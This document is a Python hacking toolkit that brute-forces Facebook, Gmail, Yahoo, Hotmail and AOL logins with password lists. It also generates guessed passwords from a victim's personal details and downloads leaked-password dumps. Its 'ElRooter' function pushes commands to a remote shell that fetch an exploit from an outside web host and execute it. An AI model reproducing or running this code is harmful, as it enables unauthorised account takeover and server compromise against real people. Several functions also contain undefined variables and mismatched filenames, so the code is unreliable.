import smtplib
import ftplib
import socket
import re
import requests
import mechanize
import os
import hashlib
from base64 import *
from pexpect import pxssh
def logo():
	print '''
						 _______                    ________  ______             __ 
						/       \                  /        |/      \           /  |
						$$$$$$$  | ______   _______$$$$$$$$//$$$$$$  |  ______  $$ |
						$$ |__$$ |/      \ /       \  $$ |  $$ |  $$ | /      \ $$ |
						$$    $$//$$$$$$  |$$$$$$$  | $$ |  $$ |  $$ |/$$$$$$  |$$ |
						$$$$$$$/ $$    $$ |$$ |  $$ | $$ |  $$ |  $$ |$$ |  $$ |$$ |
						$$ |     $$$$$$$$/ $$ |  $$ | $$ |  $$ \__$$ |$$ \__$$ |$$ |
						$$ |     $$       |$$ |  $$ | $$ |  $$    $$/ $$    $$/ $$ |
						$$/       $$$$$$$/ $$/   $$/  $$/    $$$$$$/   $$$$$$/  $$/ 
						                                                            
						                                                            
						           Created BY : Saber Sebri
						           fb.me/drwxxrxrx                                                            
	'''
def clear():
	if os.name == 'nt':
		os.system('cls')
	else:
		os.system('clear')
def menu():
	print "[1]-BruteForcing"
	print "[2]-Password Attack"
	print "[3]-Crypting"
	print "[4]-NetWorking"
	ch1 = raw_input("> ")
	if ch1 == '1':
		bruteforce()
		menu()
	if ch1 == '2':
		password()
		clear()
		menu()
	if ch1 == '3':
		crypt()
	if ch1 == '4':
		networking()
def networking():
	print "[1]-SSH"
	print "[2]-Blind Shell"
	print "[3]-FTP"
	print "[4]-Smtp Sending"
	print "[5]-ElRooter(automate server rooting)"
	ch7 =raw_input("> ")
	if ch7 == '1':
		clear()
		logo()
		ssh()
		menu()
	if ch7 == '2':
		clear()
		logo()
		blind()
		menu()
	if ch7 == '3':
		clear()
		logo()
		ftp()
		menu()
	if ch7 == "4":
		clear()
		logo()
		smtp()
		menu()
	if ch7 == '5':
		clear()
		logo()
		rooter()
		menu()
def crypt():
	print "[1]-BASE64"
	print "[2]-MD5"
	print "[3]-SHA1"
	print "[4]-SHA224"
	print "[5]-SHA256"
	print "[6]-SHA384"
	print "[7]-SHA512"
	ch6 = raw_input("> ")
	if ch6 == '1':
		clear()
		logo()
		base64()
		menu()
	if ch6 == '2':
		clear()
		logo()
		md5()
		menu()
	if ch6 == '3':
		clear()
		logo()
		sha1()
		menu()
	if ch6 == '4':
		clear()
		logo()
		sha224()
		menu()
	if ch6 == '5':
		clear()
		logo()
		sha256()
		menu()
	if ch6 == '6':
		clear()
		logo()
		sha384()
		menu()
	if ch6 == '7':
		clear()
		logo()
		sha512()
		menu()

def bruteforce() :
	print "[1]-Facebook BruteForcing"
	print "[2]-Gmail BruteForcing"
	print "[3]-Yahoo BruteForcing"
	print "[4]-Hotmail BruteForcing"
	print "[5]-Aol BruteForcing"
	ch2 = raw_input()
	if ch2 == '1':
		clear()
		logo()
		facebook()
	if ch2 == '2':
		clear()
		logo()
		gmail()
	if ch2 == '3':
		clear()
		logo()
		yahoo()
	if ch2 == '4':
		clear()
		logo()
		hotmail()
	if ch2 == '5':
		clear()
		logo()
		aol()

def yahoo(): 

    smtpserver = smtplib.SMTP("smtp.yahoo.com", 587)
    smtpserver.ehlo()
    smtpserver.starttls()
    email = raw_input("email > ")
    dictionary = raw_input("password list > ")
    dictionary = open(dictionary, "r")
    for password in dictionary:
            try:
                    smtpserver.login(email, password)

                    print "Account Cracked: %s" % password
                    print "saved in yahoo.txt"
                    save = open('yahoo.txt', "a")
                    save.write("Account Cracked: %s" % password)
                    save.close()
                    break; 
            except smtplib.SMTPAuthenticationError:
                    print "Password Incorrect: %s" % password
def gmail(): 

    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
    smtpserver.ehlo()
    smtpserver.starttls()
    email = raw_input("email > ")
    dictionary = raw_input("password list > ")
    dictionary = open(dictionary, "r")
    for password in dictionary:
            try:
                    smtpserver.login(email, password)

                    print "Account Cracked: %s" % password
                    save = open('gmail.txt', "a")
                    save.write("Account Cracked: %s" % password)
                    save.close()
                    break; 
            except smtplib.SMTPAuthenticationError:
                    print "Password Incorrect: %s" % password
def hotmail(): 

    smtpserver = smtplib.SMTP("smtp.live.com", 587)
    smtpserver.ehlo()
    smtpserver.starttls()
    email = raw_input("email > ")
    dictionary = raw_input("password list > ")
    dictionary = open(dictionary, "r")
    for password in dictionary:
            try:
                    smtpserver.login(email, password)

                    print ("Account Cracked: %s" % password);
                    save = open('hotmail.txt', "a")
                    save.write("Account Cracked: %s" % password)
                    save.close()
                    break; 
            except smtplib.SMTPAuthenticationError:
                    print "Password Incorrect: %s" % password
def aol(): 

    smtpserver = smtplib.SMTP("smtp.aol.com", 587)
    smtpserver.ehlo()
    smtpserver.starttls()
    email = raw_input("email > ")
    dictionary = raw_input("password list > ")
    dictionary = open(dictionary, "r")
    for password in dictionary:
            try:
                    smtpserver.login(email, password)

                    print ("Account Cracked: %s" % password);
                    save = open('aol.txt', "a")
                    save.write("Account Cracked: %s" % password)
                    save.close()
                    break; 
            except smtplib.SMTPAuthenticationError:
                    print "Password Incorrect: %s" % password
def facebook():
    lista = raw_input("password list name > ")
    with open('k.txt') as f:
        content = f.readlines()
    content = [x.strip() for x in content] 
    k = '\n'.join(content)
    user = raw_input("give me the user id (facebook.com/id)\n[>]")
    br = mechanize.Browser()
    br.set_handle_robots(False)
    br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7')]
    br.open('https://www.facebook.com/login.php')
    for i in content : 
        br.select_form(nr=0)
        br.form['email'] = user
        br.form['pass'] = i
        sub = br.submit()
        r = requests.head("http://facebook.com/profile.php")
        if r == "http://facebook.com"+user:
            print "the password is ",k
        else:
            print i,"Sorry i did not found"
def password():
	print "[1]-using information gathering"
	print "[2]-dictionarries"
	ch3 = raw_input("> ")
	if ch3 == '1':
		clear()
		generate()
		menu()
	if ch3 == '2':
		print "[1]-Common-Credentials"
		print "[2]-Cracked-Hashes"
		print "[3]-Honeypot-Captures"
		print "[4]-Leaked-Databases"
		print "[5]-Software"
		print "[6]-Wifi-WPA"
		ch4 = raw_input("> ")
		if ch4 == '1':
			clear()
			logo()
			commoncredentials()
			print "saved in commoncredentials.txt"
			menu()
		if ch4 == '2':
			clear()
			logo()
			crackedhash()
			print "saved in crackedhash.txt"
			menu()
		if ch4 == '3':
			clear()
			logo()
			HoneypotCaptures()
			print "saved in HoneypotCaptures.txt"
			menu()
		if ch4 == '4':
			print "[1]-000WEBHOST"
			print "[2]-ADOBE"
			print "[3]-Gmail"
			print "[4]-bible"
			print "[5]-carders"
			ch5 = raw_input("> ")
			if ch5 == '1':
				clear()
				logo()
				webhost()
				print "saved in 000webhost.txt"
				menu()
			if ch5 == '2':
				clear()
				logo()
				adobe()
				print "saved in adobe100.txt"
				menu()
			if ch5 == '3':
				clear()
				logo()
				gmailpass()
				print "saved in alleged-gmail-passwords.txt"
				menu()
			if ch5 == '4':
				clear()
				logo()
				bible()
				print "saved in bible.txt"
				menu()
			if ch5 == '5':
				clear()
				logo()
				carders()
				print "saved in carders.cc.txt"
				menu()
		if ch4 == '5':
			clear()
			logo()
			john()
			print "saved in john-the-ripper.txt"
			menu()
		if ch4 == '6':
			clear()
			logo()
			wpa()
			print "saved in probable-v2-wpa-top4800.txt"
			menu()
def generate():
    output = []
    wd = "123456\n"
    ppp = "12345\n"
    pp = "1234\n"
    wc = "123\n"
    em = "\n"
    wordlist = [ "123456\n" , "12345\n" , "1234\n","123\n"]
    #inputs
    a =raw_input("the victime's name ?\n[>] ")
    b =raw_input("the victime's surname?\n[>] ")
    c =raw_input("the victime's phone number if avaible\n[>] ")
    d =raw_input("the victime's mother name\n[>] ")
    e =raw_input("the victime's father name\n[>] ")
    f =raw_input("the victime's pet name if avaible\n[>] ")
    g =raw_input("the victime's birthday (year)\n[>] ")
    h =raw_input("the victime's birthday (month)\n[>] ")
    i =raw_input("the victime's birthday (day)\n[>] " )
    j =raw_input("the victime's sister name\n[>] ")
    k =raw_input("the victime's brother name\n[>] ")
    l =raw_input("the victime's best friend name \n[>] ")
    m =raw_input("the victime's child name \n[>] ")
    n =raw_input("the victime's car type\n[>] ")
    o =raw_input("the victime's school name\n[>] ")
    p =raw_input("the victime's grandmother name\n[>] ")
    q =raw_input("the victime's grandfather name\n[>] ")
    inputs = [a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q]
    #fill
    #GeneratedPasswords
    bi = i+h+g+em
    bii = i+"/"+h+"/"+g+em
    ph = c
    ran = a+g+em
    ik = a+g+em
    output.append(bi)
    output.append(bii)
    output.append(ph)
    output.append(ik)
    output.append(ran)
    for z in wordlist:
        for item1 in inputs:
            output.append(item1+z)
    #saving
    tneket = open('GeneratedPasswords.txt','w')
    for saveText in output:
        tneket.write(saveText)
    tneket.close()
def commoncredentials():
    url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/best1050.txt"
    pornhub = url.split('/')[-1]
    r = requests.get(url, stream=True)
    with open(pornhub, 'wb') as f:
        for chunk in r.iter_content(chunk_size=1024): 
            if chunk:
                f.write(chunk)
    return pornhub
    if os.name == 'nt':
    	os.system('rename best1050.txt Common-Credentials.txt')
    else:
    	os.system('mv milw0rm-dictionary.txt Common-Credentials.txt')
    return "saved in Common-Credentials.txt"
def crackedhash():
    url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Cracked-Hashes/milw0rm-dictionary.txt"
    pornhub = url.split('/')[-1]
    r = requests.get(url, stream=True)
    with open(pornhub, 'wb') as f:
        for chunk in r.iter_content(chunk_size=1024): 
            if chunk:
                f.write(chunk)
    return pornhub
    if os.name == 'nt':
    	os.system('rename milw0rm-dictionary.txt crackedhash.txt')
    else:
    	os.system('mv milw0rm-dictionary.txt crackedhash.txt')
    return "saved in crackedhash.txt"
def HoneypotCaptures():
    url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Honeypot-Captures/Sucuri-Top-Wordpress-Passwords.txt"
    local_filename = url.split('/')[-1]
    r = requests.get(url, stream=True)
    with open(local_filename, 'wb') as f:
        for chunk in r.iter_content(chunk_size=1024): 
            if chunk:
                f.write(chunk)
    if os.name == 'nt':
    	os.system('rename Sucuri-Top-Wordpress-Passwords.txt HoneypotCaptures.txt')
    else:
    	os.system('mv Sucuri-Top-Wordpress-Passwords.txt HoneypotCaptures.txt')
    return "saved in HoneypotCaptures.txt"
def webhost():
    url = "https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/000webhost.txt"
    local_filename = url.split('/')[-1]
    r = requests.get(url, stream=True)
    with open(local_filename, 'wb') as f:
        for chunk in r.iter_content(chunk_size=1024): 
            if chunk:
                f.write(chunk)
    return "saved in 000webhost.txt"
def adobe():
    url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/adobe100.txt"
    local_filename = url.split('/')[-1]
    r = requests.get(url, stream=True)
    with open(local_filename, 'wb') as f:
        for chunk in r.iter_content(chunk_size=1024): 
            if chunk:
                f.write(chunk)
    return "saved in adobe100.txt"
def gmailpass():
    url = "https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/alleged-gmail-passwords.txt"
    local_filename = url.split('/')[-1]
    r = requests.get(url, stream=True)
    with open(local_filename, 'wb') as f:
        for chunk in r.iter_content(chunk_size=1024): 
            if chunk:
                f.write(chunk)
    return "saved in alleged-gmail-passwords.txt"
def bible():
    url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/bible.txt"
    local_filename = url.split('/')[-1]
    r = requests.get(url, stream=True)
    with open(local_filename, 'wb') as f:
        for chunk in r.iter_content(chunk_size=1024): 
            if chunk:
                f.write(chunk)
    return "saved in bible.txt"
def carders():
    url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/carders.cc.txt"
    local_filename = url.split('/')[-1]
    r = requests.get(url, stream=True)
    with open(local_filename, 'wb') as f:
        for chunk in r.iter_content(chunk_size=1024): 
            if chunk:
                f.write(chunk)
    return "saved in carders.cc.txt"
def john():
    url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Software/john-the-ripper.txt"
    local_filename = url.split('/')[-1]
    r = requests.get(url, stream=True)
    with open(local_filename, 'wb') as f:
        for chunk in r.iter_content(chunk_size=1024): 
            if chunk:
                f.write(chunk)
    return "john-the-ripper.txt"
def wpa():
    url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt"
    local_filename = url.split('/')[-1]
    r = requests.get(url, stream=True)
    with open(local_filename, 'wb') as f:
        for chunk in r.iter_content(chunk_size=1024): 
            if chunk:
                f.write(chunk)
def base64():
	string = raw_input("string > ")
	print b64encode(string)
def md5():
    xx =raw_input("Your String > ")
    mdf = hashlib.md5(xx)
    print mdf.hexdigest()
def sha1():
    xx =raw_input("Your String > ")
    faded = hashlib.sha1(xx)
    walker = faded.hexdigest()
    print walker
def sha224():
    xx =raw_input("Your String > ")
    faded = hashlib.sha224(xx)
    walker = faded.hexdigest()
    print walker
def sha256():
    xx =raw_input("Your String > ")
    faded = hashlib.sha256(xx)
    walker = faded.hexdigest()
    print walker
def sha384():
    xx =raw_input("Your String > ")
    faded = hashlib.sha384(xx)
    walker = faded.hexdigest()
    print walker
def sha512():
    xx =raw_input("Your String > ")
    faded = hashlib.sha512(xx)
    walker = faded.hexdigest()
    print walker
def ssh():
    s = pxssh.pxssh()
    ip = raw_input("give me the ip : \n[>]")
    user = raw_input("give me the user : \n[>]")
    password = raw_input("give me the password\n[>]")
    if not s.login (ip, user, password):
        print "FAILED TO LOGIN !!"
    else:
        print "Successful Connected ! :"
        while True:
            comm = raw_input("THE COMMAND :\n[>]")
            s.sendline (comm)
        s.prompt()         
        if comm == "exit":  
            print "thank u for using me"   
            s.logout()
def blind():
    host = raw_input("IP > ")
    port = input("Port > ")
    try :
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        print "successfully connected"
        while True :
            cmd = raw_input("Command > ")
            result = s.recv(1024).strip()
            s.send(cmd + "\n")
    except:
        print "Failed TO Login"
def ftp():
    ip = raw_input("HOST > ") 
    user = raw_input("User > ")
    passw = raw_input("Password > ")   
    server = ftplib.FTP()
    server.connect(ip, 21)
    server.login(user, passw)
    while True :
        cmd = raw_input("Command > ")
        s.sendline (comm)
        s.prompt()
        if cmd == "exit":
            break
def smtp():
    host = raw_input("HOST > ")
    port = input("port > ")
    user = raw_input("User > ")
    passwd = raw_input("Password > ")
    try :
        server.login(user, passwd)
        msg = raw_input("message to send ")
        to = raw_input("For Who ? ")
        server.sendmail(user, to, msg)
    except:
        print "failed to connect"
import socket
def rooter():
    host = raw_input("host > ")
    port = input("port > ")
    try :
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        print "successfully connected"
        for i in range(1):
            cmd = "wget http://www.lisaborin.com/exploit"
            result = s.recv(1024).strip()
            s.send(cmd + "\n")
        for i in range(1):
            cmd = "chmod +x saber"
            result = s.recv(1024).strip()
            s.send(cmd + "\n")
        for i in range(3):
            cmd = "./exploit saber2001"
            result = s.recv(1024).strip()
            s.send(cmd + "\n")
            print (result)
    except socket.error:
        print "cannot connect"
clear()
logo()
menu()
